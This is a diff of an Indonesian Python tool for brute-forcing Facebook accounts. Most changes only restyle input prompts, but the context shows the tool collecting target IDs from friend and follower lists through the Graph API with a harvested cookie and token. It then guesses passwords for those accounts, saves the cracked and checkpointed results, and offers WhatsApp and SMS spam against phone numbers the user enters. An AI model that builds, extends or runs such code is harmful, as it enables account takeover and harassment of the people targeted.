@@ -306,7 +306,7 @@ def menu(my_name,my_id):
 	cetak(panel(f'[bold white][[bold green]•[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold white]User Ip  : [bold green]{ip}[/][/][bold white]\n[[bold green]•[/][bold white]][/] [bold white]Status   : [bold green]Premium ',width=90,title=f"[bold green]Infomasi",style=f"bold white"))
 	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Crack Publick OR Friends [[bold green] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack Massal [[bold green] ON [bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Crack Username [[bold green] ON [bold white]]\n[bold white][[bold green]04[/][bold white]][/] [bold white]Crack File [[bold green] ON [bold white]]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Crack Followers [[bold green] ON [bold white]]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Crack Email [[bold green] ON [bold white]]\n[bold white][[bold green]07[/][bold white]][/] [bold white]Cek Result [[bold green] ON [bold white]][/]\n[bold white][[bold green]08[/][bold white]][/] [bold white]Cek Opsi Chekpoint [[bold green] ON [bold white]]\n[bold white][[bold green]09[/][bold white]][/] [bold white]Spam WhatsApp [[bold green] ON [bold white]]\n[bold white][[bold green]10[/][bold white]][/] [bold white]Spam Sms [[bold green] ON [bold white]]\n[bold white][[bold green]11[/][bold white]][/] [bold white]Report Bug [[bold green] ON [bold white]]\n[bold white][[bold green]00[/][bold white]][/] [bold red]Ganti Cookies [[bold green] ON [bold white]][/]',width=90,title=f"[bold green]List Menu",style=f"bold white"))
 	cetak(panel(f'[bold Red]Warning[bold white] Gunakan Script Ini Dengan Baik Jangan Di Salah Gunakan',width=90,title=f"[bold green]Informasi Crack",style=f"bold white"))
-	_____brayennn___xd____ = input(f' ╰─  Pilih Menu Crack : ')
+	_____brayennn___xd____ = input(f'[bold white][[bold green]•[/][bold white]][/] [bold white]Pilih Menu Crack : ')
 	if _____brayennn___xd____ in ['1','01']:
 		brayen_dump()
 	elif _____brayennn___xd____ in ['2','02']:
@@ -365,7 +365,7 @@ def process_data1():
 def spam_sms():
 	global nomor 
 	cetak(panel(f'''   Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
-	nomor = input(f" ╰─  Input No Hp : +62").replace("+62","")
+	nomor = input(f"[bold white][[bold green]•[/][bold white]][/] [bold white]Input No Hp : +62").replace("+62","")
 	if nomor == "":
 		pass
 	else:
@@ -727,7 +727,7 @@ class sxp_sms:
 def spam_wa():
 	global nomor
 	cetak(panel(f'''   Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
-	nomor = input(f" ╰─  Input No Hp : +62").replace("+62","")
+	nomor = input(f"[bold white][[bold green]•[/][bold white]][/] [bold white]Input No Hp : +62").replace("+62","")
 	if nomor == "":
 		pass
 	else:
@@ -886,7 +886,7 @@ def pengikut():
 		exit()
 	ses = requests.Session()
 	cetak(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=90,padding=(0,7),style=f"bold white"))
-	akun = console.input(f' ╰─  Masukan Id Target : ')
+	akun = console.input(f'[bold white][[bold green]•[/][bold white]][/] [bold white]Masukan Id Target : ')
 	try:
 		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
 		for pi in koh2['subscribers']['data']:
@@ -951,7 +951,7 @@ def crack_email():
 	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
 	global ok , cp
 	cetak(nel(f'Masukan Nama Email Yang Ingin Di Crack, Contoh : Andi, Dian, Putri, Aditya',width=90,padding=(0,5),style=f"bold white"))
-	nama = console.input(f' ╰─  Masukan Nama Target : ')
+	nama = console.input(f'[bold white][[bold green]•[/][bold white]][/] [bold white]Masukan Nama Target : ')
 	if ',' in str(nama):
 		print(f" ╰─  Masukan Nama, Jangan Kosong Ngab")
 		time.sleep(3);exit()
@@ -1019,7 +1019,7 @@ def crack_file():
 #-----------------[ HASIL-CRACK ]-----------------#
 def result():
 	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Hasil OK[/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Hasil CP[/]\n[bold white][[bold green]03[/][bold white]][/] [bold red]Kembali[/]',width=90,title=f"[bold white]• [/][bold green]List Menu Cek[/][bold white] •[/]",style=f"bold white"))
-	kz = input(f' ╰─  Pilih : ')
+	kz = input(f'[bold white][[bold green]•[/][bold white]][/] [bold white]Pilih : ')
 	if kz in ['2','02']:
 		try:vin = os.listdir('CP')
 		except FileNotFoundError:
@@ -1119,21 +1119,21 @@ def brayen_dump():
 		kukis = open('.cok.txt','r').read()
 	except IOError:
 		exit()
-	cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold white'))
-	pil = input(f' ╰─  Masukan ID Target : ')
+	cetak(panel('\t[bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold white'))
+	pil = input(f'[bold white][[bold green]•[/][bold white]][/] [bold white]Masukan ID Target : ')
 	try:
 		koH = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
 		for pi in koH['friends']['data']:
 			try:id.append(pi['id']+'|'+pi['name'])
 			except:continue
 		print('')
-		print(f' ╰─  Total ID yang Terkumpul : {h}'+str(len(id)))
+		print(f'[bold white][[bold green]•[/][bold white]][/] [bold white]Total ID yang Terkumpul : {h}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(' ╰─  Internet Lu Gak Ada Anjing')
 		exit()
 	except (KeyError,IOError):
-		print(' ╰─  Pertemanan Tidak Publick Atau Cookie And Token Anda Busuk')
+		print(' [bold white][[bold green]•[/][bold white]][/] [bold white]Pertemanan Tidak Publick Atau Cookie And Token Anda Busuk')
 		exit()
 #-------------------[ CRACK-PUBLIK ]----------------#
 def dump_massal():
@@ -1144,7 +1144,7 @@ def dump_massal():
 		exit()
 	try:
 		cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold green]Crack Massal",style=f"bold white"))
-		jum = int(input(f' ╰─  {P}Mau Berapa Idz Target {x} : '))
+		jum = int(input(f'[bold white][[bold green]•[/][bold white]][/] [bold white]{P}Mau Berapa Idz Target {x} : '))
 	except ValueError:
 		print(' ╰─  Wrong input ')
 		exit()
@@ -1155,7 +1155,7 @@ def dump_massal():
 	yz = 0
 	for met in range(jum):
 		yz+=1
-		kl = input(f' ╰─  {P}Masukan Idz Target Yang Ke '+str(yz)+' : ')
+		kl = input(f' [bold white][[bold green]•[/][bold white]][/] [bold white]{P}Masukan Idz Target Yang Ke '+str(yz)+' : ')
 		uid.append(kl)
 	for userr in uid:
 		try:
@@ -1186,7 +1186,7 @@ def dump_massal():
 def setting():
 	print('')
 	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Crack Idz Old [[bold red]Not Recommended[bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack Idz New [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Crack Idz Random [[bold green]Recommended[bold white]][/]',width=90,title=f"[bold green]Setting Urutan Idz",style=f"bold white"))
-	hu = input(f' ╰─  Pilih Urutan id : ')
+	hu = input(f'[bold white][[bold green]•[/][bold white]][/] [bold white]Pilih Urutan id : ')
 	if hu in ['1','01']:
 		for tua in sorted(id):
 			id2.append(tua)
@@ -1207,7 +1207,7 @@ def setting():
 	else:
 		print(' ╰─  Pilih Yang Bener Kontooll ')
 		exit()
-	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Metode Mobile V1 [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Metode Mbasic [[bold green]Recommended[bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Metode Free [[bold green]Recommended[bold white]][/]\n[bold white][[bold green]04[/][bold white]][/] [bold white]Metode Mbeta [[bold red]Not Recommended[bold white]][/]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Metode Async [[bold green]Recommended[bold white]][/]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Metode Reguler [[bold green]Very Recommended[bold white]][/]',width=90,title=f"[bold green]Setting Metode",style=f"bold white"))
+	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Metode Mobile V1 [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Metode Mbasic V1 [[bold green]Recommended[bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Metode Free [[bold green]Recommended[bold white]][/]\n[bold white][[bold green]04[/][bold white]][/] [bold white]Metode Mbeta [[bold red]Not Recommended[bold white]][/]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Metode Async [[bold green]Recommended[bold white]][/]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Metode Reguler [[bold green]Very Recommended[bold white]][/]',width=90,title=f"[bold green]Setting Metode",style=f"bold white"))
 	hc = input(f' ╰─  Pilih Metode : ')
 	if hc in ['1','01']:
 		method.append('mobile')
@@ -1240,7 +1240,7 @@ def setting():
 	uatambah = input(f' ╰─  Pilih : ')
 	if uatambah in ['y','Ya','ya','Y']:
 		ualuh.append('ya')
-		bzer = input(f' ╰─  Masukan User-Agent : ')
+		bzer = input(f'[bold white][[bold green]•[/][bold white]][/] [bold white]Masukan User-Agent : ')
 		ualu.append(bzer)
 	else:
 		ualuh.append('tidak')
